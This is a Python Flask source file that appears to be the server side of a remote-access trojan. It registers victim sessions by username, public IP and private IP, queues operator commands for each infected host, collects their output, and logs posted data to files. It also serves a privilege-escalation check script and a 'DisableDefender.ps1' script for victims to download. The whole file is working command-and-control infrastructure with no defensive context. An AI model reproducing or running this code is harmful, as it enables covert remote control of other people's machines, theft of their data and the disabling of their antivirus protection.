from calendar import day_abbr
from curses.ascii import isdigit
from flask import Flask, request
import asyncio
import sys
import json
import threading, time
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)


app = Flask(__name__)


commands = {}
sessions = [{"id": 0, "session": ""}]
outputs = []


@app.route("/get_res", methods=["GET"])
def getresults():
    global outputs
    ret = ""
    for r in outputs:
        if type(r) is str:
            if r != "Nope":
                ret += r + "\n"
        elif type(r) is bytes:
            if r != b"Nope":
                ret += str(r, encoding="utf-8") + "\n"
    outputs = []
    return ret


@app.route("/admin/<data>", methods=["GET"])
def admin(data):
    global outputs
    global sessions

    a =  data
    if a == "ls":
        res = ("You have " + str(len(commands.keys())) + " sessions:\n")
        for c in sessions:
            if c["id"] != 0:
                res += (str(c["id"]) + "> " + c["session"].replace("_", " ") + "\n")
        outputs.append(res)
        return(res)
    elif a.split(" ")[0].isdigit():
        b = a.split(" ")
        print("session %s: " % (b[0]))
        print(a.split(" ", 1))
        commands[sessions[int(b[0])]["session"]].append(a.split(" ", 1)[1])
        print(sessions)
        print(commands)
    return "Command sent to session " + b[0]

    
@app.route('/', methods=['POST'])
def process_json():
    data = str(request.data, 'utf-8')
    header = data.split("\n")[0].split(";")
    u = header[0]
    print("u = " + u)
    pub = header[1]
    print("pub = " + pub)
    priv = header[2]
    print("priv = " + priv)
    print(u + "_" + pub + "_" + priv)
    open("./Logs/" + u + "_" + pub + "_" + priv + ".html","a").write(data)  
    return "OK"


@app.route("/<user>/<pub>/<priv>", methods=["GET"])
def sendCMD(user, pub, priv):
    global outputs
    global commands
    global sessions
    if user + "_" + pub + "_" + priv not in commands.keys():
        commands[user + "_" + pub + "_" + priv] = []
        sessions.append({"id": sessions[-1]["id"] + 1, "session": user + "_" + pub + "_" + priv})
        ret = ("[*] new session :\n\t* Id: "+ str(sessions[-1]["id"]) +"\n\t* User: " + user + "\n\t* Public IP: "+ pub +"\n\t* Private IP: " + priv + "\n")
        outputs.append(ret)
        return "NULL"
    if len(commands[user + "_" + pub + "_" + priv]) > 0:
        c = ";".join(commands[user + "_" + pub + "_" + priv])
    else:
        c = "NULL"
    commands[user + "_" + pub + "_" + priv] = []
    return c

@app.route("/printcmd", methods=["POST"])
def handlestuff():
    global outputs
    try:   
        if  b"NULL" not in request.data:
            outputs.append(request.data)
        print(str(request.data, encoding="latin1").split("b\'")[1][:-1])
    except:
        pass
    return "OK"

@app.route("/PrivescCheck.ps1", methods=["GET"])
def privesc():
    return open("./PrivescCheck.ps1", "rb").read()

@app.route("/DisableDefender.ps1", methods=["GET"])
def disableDefender():
    return open("./DisableDefender.ps1", "rb").read()

if __name__ == "__main__":
    app.run(host="0.0.0.0")

